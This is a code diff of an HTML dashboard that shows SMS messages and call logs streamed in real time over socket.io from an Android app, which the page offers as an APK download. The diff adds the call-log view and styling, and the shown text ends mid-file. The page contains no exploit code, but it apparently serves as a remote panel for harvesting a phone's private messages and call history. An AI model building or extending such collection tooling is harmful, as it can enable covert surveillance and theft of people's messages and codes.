@@ -1,26 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>SMS Real-time</title>
+  <title>SMS & Call Logs (Real-time)</title>
   <script src="https://cdn.socket.io/4.7.1/socket.io.min.js"></script>
+
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    h2 { margin-top: 30px; }
+
+    ul { list-style: none; padding: 0; }
+    li {
+      padding: 8px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .incoming { color: green; }
+    .outgoing { color: blue; }
+    .missed { color: red; }
+  </style>
 </head>
 <body>
 
-  <h1>Real-time SMS Messages</h1>
+  <h1>📡 Real-time Dashboard</h1>
 
   <!-- ✅ DOWNLOAD BUTTON -->
   <button onclick="downloadApk()">⬇ Download Android App</button>
 
+  <!-- ✅ SMS SECTION -->
+  <h2>📩 SMS Messages</h2>
   <ul id="messages"></ul>
+
+  <!-- ✅ CALL LOG SECTION -->
+  <h2>📞 Call Logs</h2>
+  <ul id="calls"></ul>
 
   <script>
     const socket = io();
 
+    /* ====================
+       REAL-TIME SMS
+    ==================== */
     socket.on("new_sms", (sms) => {
       const li = document.createElement("li");
       li.textContent =
         `[${new Date(sms.receivedAt).toLocaleTimeString()}] ${sms.sender}: ${sms.message}`;
       document.getElementById("messages").prepend(li);
+    });
+
+    /* ====================
+       REAL-TIME CALL LOGS
+    ==================== */
+    socket.on("new_call_log", (call) => {
+      const li = document.createElement("li");
+
+      const time = new Date(call.date).toLocaleString();
+
+      li.className = call.type.toLowerCase();
+      li.textContent =
+        `[${time}] ${call.type} | ${call.number} | ${call.duration}s`;
+
+      document.getElementById("calls").prepend(li);
     });
 
     function downloadApk() {
